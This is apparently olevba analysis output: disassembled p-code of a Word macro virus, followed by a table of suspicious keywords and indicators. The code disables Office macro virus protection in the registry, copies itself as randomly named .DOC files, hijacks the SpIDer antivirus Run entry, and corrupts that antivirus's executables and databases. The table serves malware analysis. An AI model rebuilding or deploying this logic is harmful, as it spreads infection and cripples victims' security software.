' Line #117:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Private Function Gds(id_FFFE As Byte) As Byte)
' Line #120:
' 	Dim (Const) 
' 	LitStr 0x0002 ":\"
' 	VarDefn Rt
' Line #121:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #122:
' 	Dim 
' 	VarDefn St (As String)
' Line #123:
' 	Dim 
' 	VarDefn i (As Byte)
' 	VarDefn k (As Byte)
' Line #124:
' 	OnError Ext 
' Line #125:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001B 
' 	For 
' Line #126:
' 	LitDI2 0x0042 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rt 
' 	Concat 
' 	LitDI2 0x0060 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St St 
' Line #127:
' 	Ld Friend 
' 	St FileNum 
' Line #128:
' 	Ld St 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #129:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #130:
' 	Ld St 
' 	ArgsCall Kill 0x0001 
' Line #131:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #132:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	Label Ext 
' Line #134:
' 	Ld k 
' 	St Gds 
' Line #135:
' 	EndFunc 
' Line #136:
' 	FuncDefn (Private Function Rdd(ByVal Path As String, id_FFFE As String) As String)
' Line #137:
' 	Dim (Const) 
' 	LitStr 0x0003 "*.*"
' 	VarDefn Maska
' Line #138:
' 	Dim 
' 	VarDefn n (As Integer)
' 	VarDefn i (As Integer)
' Line #139:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0FA0 
' 	VarDefn Buf (As String)
' Line #140:
' 	Dim 
' 	VarDefn FindNmi (As String)
' Line #141:
' 	LitDI2 0x0000 
' 	St n 
' Line #142:
' 	LitDI2 0x0001 
' 	St i 
' Line #143:
' 	Ld Path 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Path 
' 	EndIf 
' Line #144:
' 	OnError Errs 
' Line #145:
' 	Ld Path 
' 	LitDI2 0x0017 
' 	ArgsLd Dir 0x0002 
' 	St FindNmi 
' Line #146:
' 	Ld FindNmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #147:
' 	Ld Path 
' 	Ld FindNmi 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #148:
' 	Ld FindNmi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	IfBlock 
' Line #149:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #150:
' 	Ld FindNmi 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #151:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	Ld Dir 
' 	St FindNmi 
' Line #155:
' 	Loop 
' Line #156:
' 	Ld Path 
' 	Ld n 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Buf 0x0001 
' 	Concat 
' 	ArgsLd UCase 0x0001 
' 	St Rdd 
' Line #157:
' 	Label Errs 
' Line #158:
' 	Ld n 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Rdd 
' 	EndIf 
' Line #159:
' 	EndFunc 
' Line #160:
' 	FuncDefn (Private Function Rdr(ByVal Path As String, id_FFFE As String) As String)
' Line #161:
' 	Dim (Const) 
' 	LitStr 0x0001 ":"
' 	VarDefn Root
' Line #162:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #163:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #164:
' 	Dim 
' 	VarDefn GetRandom (As Integer)
' Line #165:
' 	Dim 
' 	VarDefn RandStep (As Integer)
' Line #166:
' 	LitDI2 0x03E9 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St GetRandom 
' Line #167:
' 	LitDI2 0x0000 
' 	St RandStep 
' Line #168:
' Line #169:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #170:
' 	Ld Path 
' 	ArgsLd Rdd 0x0001 
' 	St tmp 
' Line #171:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld tmp 
' 	St Path 
' 	EndIf 
' Line #172:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #173:
' 	LitStr 0x0000 ""
' 	St Rdr 
' Line #174:
' 	ExitFunc 
' Line #175:
' 	EndIfBlock 
' Line #176:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #177:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Rdr 
' Line #178:
' 	ExitFunc 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	Ld RandStep 
' 	SelectCase 
' Line #181:
' 	LitDI2 0x0000 
' 	LitDI2 0x00C8 
' 	CaseTo 
' 	CaseDone 
' Line #182:
' 	Ld RandStep 
' 	LitDI2 0x00C8 
' 	Add 
' 	St RandStep 
' Line #183:
' 	LitDI2 0x0190 
' 	LitDI2 0x0258 
' 	CaseTo 
' 	CaseDone 
' Line #184:
' 	Ld RandStep 
' 	LitDI2 0x0064 
' 	Add 
' 	St RandStep 
' Line #185:
' 	LitDI2 0x02BC 
' 	LitDI2 0x0384 
' 	CaseTo 
' 	CaseDone 
' Line #186:
' 	Ld RandStep 
' 	LitDI2 0x0032 
' 	Add 
' 	St RandStep 
' Line #187:
' 	EndSelect 
' Line #188:
' 	Ld RandStep 
' 	Ld GetRandom 
' 	Ge 
' 	IfBlock 
' Line #189:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Rdr 
' Line #190:
' 	ExitFunc 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #193:
' 	EndFunc 
' Line #194:
' 	FuncDefn (Private Function Rfe(ByVal Path As String, Maska As String, id_FFFE As String) As String)
' Line #195:
' 	Dim 
' 	VarDefn n (As Integer)
' 	VarDefn i (As Integer)
' Line #196:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0FA0 
' 	VarDefn Buf (As String)
' Line #197:
' 	Dim 
' 	VarDefn FindNmi (As String)
' Line #198:
' 	LitDI2 0x0000 
' 	St n 
' Line #199:
' 	LitDI2 0x0001 
' 	St i 
' Line #200:
' 	Ld Path 
' 	Ld Maska 
' 	Concat 
' 	St Path 
' Line #201:
' 	OnError Errs 
' Line #202:
' 	Ld Path 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St FindNmi 
' Line #203:
' 	Ld FindNmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #204:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #205:
' 	Ld FindNmi 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #206:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #207:
' 	Ld Dir 
' 	St FindNmi 
' Line #208:
' 	Loop 
' Line #209:
' 	Ld n 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Buf 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St Rfe 
' Line #210:
' 	Label Errs 
' Line #211:
' 	Ld n 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Rfe 
' 	EndIf 
' Line #212:
' 	EndFunc 
' Line #213:
' 	FuncDefn (Private Sub Dfe(Path As String))
' Line #214:
' 	Dim 
' 	VarDefn Attr (As Integer)
' Line #215:
' 	Dim 
' 	VarDefn Siz (As Long)
' 	VarDefn Cmp (As Long)
' Line #216:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #217:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #218:
' 	Dim 
' 	VarDefn Ofs (As Byte)
' Line #219:
' 	OnError Ends 
' Line #220:
' 	Ld Path 
' 	ArgsLd FileLen 0x0001 
' 	St Siz 
' Line #221:
' 	Ld Siz 
' 	LitDI2 0x000B 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #222:
' 	Ld Path 
' 	ArgsLd GetAttr 0x0001 
' 	St Attr 
' Line #223:
' 	Ld Path 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #224:
' 	Ld Friend 
' 	St FileNum 
' Line #225:
' 	Ld Path 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #226:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0009 
' 	St Ofs 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St Ofs 
' 	EndIf 
' Line #227:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Siz 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	GetRec 
' Line #228:
' 	Ld Siz 
' 	Ld Cmp 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #229:
' 	Ld Siz 
' 	St Cmp 
' Line #230:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x7FFB 
' 	St Siz 
' 	EndIf 
' Line #231:
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	RedimAs Buf 0x0001 (As Byte)
' Line #232:
' 	LitDI2 0x0064 
' 	UMi 
' 	Paren 
' 	ArgsCall Rnd 0x0001 
' Line #233:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	GetRec 
' Line #234:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	For 
' Line #235:
' 	Ld i 
' 	ArgsLd Buf 0x0001 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Add 
' 	FnInt 
' 	Xor 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #236:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #237:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	PutRec 
' Line #238:
' 	Ld Cmp 
' 	Ld Ofs 
' 	Add 
' 	St Cmp 
' Line #239:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Cmp 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	PutRec 
' Line #240:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #241:
' 	Ld Path 
' 	Ld Attr 
' 	ArgsCall SetAttr 0x0002 
' Line #242:
' 	Label Ends 
' Line #243:
' 	EndSub 
' Line #244:
' 	FuncDefn (Private Sub Rcy(Sours As String))
' Line #245:
' 	Dim 
' 	VarDefn Fls (As String)
' 	VarDefn DirR (As String)
' Line #246:
' 	Dim 
' 	VarDefn k (As Long)
' 	VarDefn Er (As Integer)
' Line #247:
' 	OnError YYY 
' Line #248:
' 	Do 
' Line #249:
' 	ArgsLd Gds 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0042 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Rdr 0x0001 
' 	St DirR 
' Line #250:
' 	Ld DirR 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd Rfe 0x0002 
' 	St Fls 
' Line #251:
' 	Ld Er 
' 	LitDI2 0x0001 
' 	Add 
' 	St Er 
' Line #252:
' 	Ld Er 
' 	LitDI2 0x000A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #253:
' 	Ld Fls 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #254:
' 	LitDI2 0x0001 
' 	Ld Fls 
' 	LitStr 0x0001 "."
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	St k 
' Line #255:
' 	Ld k 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #256:
' 	Ld Fls 
' 	Ld Fls 
' 	FnLen 
' 	Ld Fls 
' 	FnLen 
' 	Ld k 
' 	Sub 
' 	Paren 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St Fls 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	Ld Fls 
' 	LitStr 0x0004 ".DOC"
' 	Concat 
' 	St Fls 
' Line #259:
' 	Ld DirR 
' 	Ld Fls 
' 	Concat 
' 	St DirR 
' Line #260:
' 	Ld Sours 
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsLd CopyFile& 0x0003 
' 	St k 
' Line #261:
' 	Label YYY 
' Line #262:
' 	EndSub 
' Line #263:
' 	FuncDefn (Private Sub Dpio())
' Line #264:
' 	Dim (Const) 
' 	LitStr 0x001B "\Software\Microsoft\Office\"
' 	VarDefn Path
' Line #265:
' 	Dim (Const) 
' 	LitStr 0x0004 "8.0\"
' 	VarDefn Ver
' Line #266:
' 	Dim (Const) 
' 	LitStr 0x0012 "New User Settings\"
' 	VarDefn NewUse
' Line #267:
' 	Dim (Const) 
' 	LitStr 0x0009 "\.Default"
' 	VarDefn Def
' Line #268:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Keys (As String)
' Line #269:
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	LitDI2 0x0001 
' 	ArgsSt Keys 0x0001 
' Line #270:
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	LitDI2 0x0002 
' 	ArgsSt Keys 0x0001 
' Line #271:
' 	LitStr 0x000A "HKEY_USERS"
' 	LitDI2 0x0003 
' 	ArgsSt Keys 0x0001 
' Line #272:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Dis (As String)
' Line #273:
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	LitDI2 0x0001 
' 	ArgsSt Dis 0x0001 
' Line #274:
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0002 
' 	ArgsSt Dis 0x0001 
' Line #275:
' 	LitStr 0x0014 "MacroVirusProtection"
' 	LitDI2 0x0003 
' 	ArgsSt Dis 0x0001 
' Line #276:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	VarDefn AddId (As String)
' Line #277:
' 	LitStr 0x000C "Word\Options"
' 	LitDI2 0x0001 
' 	ArgsSt AddId 0x0001 
' Line #278:
' 	LitStr 0x0015 "Excel\Microsoft Excel"
' 	LitDI2 0x0002 
' 	ArgsSt AddId 0x0001 
' Line #279:
' 	LitStr 0x0012 "PowerPoint\Options"
' 	LitDI2 0x0003 
' 	ArgsSt AddId 0x0001 
' Line #280:
' 	LitStr 0x0010 "Word\7.0\Options"
' 	LitDI2 0x0004 
' 	ArgsSt AddId 0x0001 
' Line #281:
' 	LitStr 0x0019 "Excel\7.0\Microsoft Excel"
' 	LitDI2 0x0005 
' 	ArgsSt AddId 0x0001 
' Line #282:
' 	LitStr 0x0016 "PowerPoint\7.0\Options"
' 	LitDI2 0x0006 
' 	ArgsSt AddId 0x0001 
' Line #283:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #284:
' 	Dim 
' 	VarDefn k (As Integer)
' Line #285:
' 	Dim 
' 	VarDefn x (As Integer)
' Line #286:
' 	Dim 
' 	VarDefn Use (As String)
' Line #287:
' 	OnError (Resume Next) 
' Line #288:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #289:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0021 "\System\CurrentControlSet\control"
' 	Concat 
' 	LitStr 0x000C "Current User"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St Use 
' Line #290:
' 	Ld Use 
' 	LitStr 0x0008 ".Default"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St x 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St x 
' 	EndIf 
' Line #291:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #292:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #293:
' 	Ld k 
' 	SelectCase 
' Line #294:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #295:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #296:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #297:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #298:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #299:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #300:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #301:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #302:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #303:
' 	EndSelect 
' Line #304:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #305:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #306:
' 	EndWith 
' Line #307:
' 	EndSub 
' Line #308:
' 	FuncDefn (Private Sub Asd())
' Line #309:
' 	Dim (Const) 
' 	LitStr 0x002E "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	VarDefn Path1
' Line #310:
' 	Dim (Const) 
' 	LitStr 0x002D "\System\CurrentControlSet\Services\VxD\SpIDer"
' 	VarDefn Path2
' Line #311:
' 	Dim (Const) 
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	VarDefn Key
' Line #312:
' 	Dim (Const) 
' 	LitStr 0x000A "RUNDLL.EXE"
' 	VarDefn RN
' Line #313:
' 	Dim 
' 	VarDefn Nmi (As String)
' Line #314:
' 	Dim 
' 	VarDefn ProgPath (As String)
' Line #315:
' 	OnError (Resume Next) 
' Line #316:
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Nmi 
' Line #317:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #318:
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld Nmi 
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St ProgPath 
' Line #319:
' 	Ld ProgPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld ProgPath 
' 	Ld RN 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #320:
' 	Ld RN 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld Nmi 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #321:
' 	LitStr 0x0004 "*IOS"
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path2 
' 	Concat 
' 	LitStr 0x0009 "StaticVxD"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #322:
' 	Ld ProgPath 
' 	ArgsLd Ptd 0x0001 
' 	St ProgPath 
' Line #323:
' 	Ld ProgPath 
' 	LitStr 0x0005 "*.EXE"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St Nmi 
' Line #324:
' 	Ld Nmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #325:
' 	Ld ProgPath 
' 	Ld Nmi 
' 	Concat 
' 	Paren 
' 	ArgsCall Dfe 0x0001 
' Line #326:
' 	Ld Dir 
' 	St Nmi 
' Line #327:
' 	Loop 
' Line #328:
' 	Ld ProgPath 
' 	LitStr 0x0005 "*.VDB"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St Nmi 
' Line #329:
' 	Ld Nmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #330:
' 	Ld ProgPath 
' 	Ld Nmi 
' 	Concat 
' 	Paren 
' 	ArgsCall Dfe 0x0001 
' Line #331:
' 	Ld Dir 
' 	St Nmi 
' Line #332:
' 	Loop 
' Line #333:
' 	EndIfBlock 
' Line #334:
' 	EndWith 
' Line #335:
' 	EndSub 
' Line #336:
' 	FuncDefn (Private Function Ptd(Path As String, id_FFFE As String) As String)
' Line #337:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #338:
' 	Dim 
' 	VarDefn i (As Long)
' 	VarDefn k (As Long)
' Line #339:
' 	OnError Sti 
' Line #340:
' 	Ld Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sti 
' 	EndIf 
' Line #341:
' 	Ld Path 
' 	FnLen 
' 	St k 
' Line #342:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld k 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #343:
' 	Ld Path 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #344:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #345:
' 	Ld Path 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	St Ptd 
' Line #346:
' 	ExitFunc 
' Line #347:
' 	Label Sti 
' Line #348:
' 	LitStr 0x0000 ""
' 	St Ptd 
' Line #349:
' 	EndFunc 
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' Line #370:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBADLG.DLL          |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

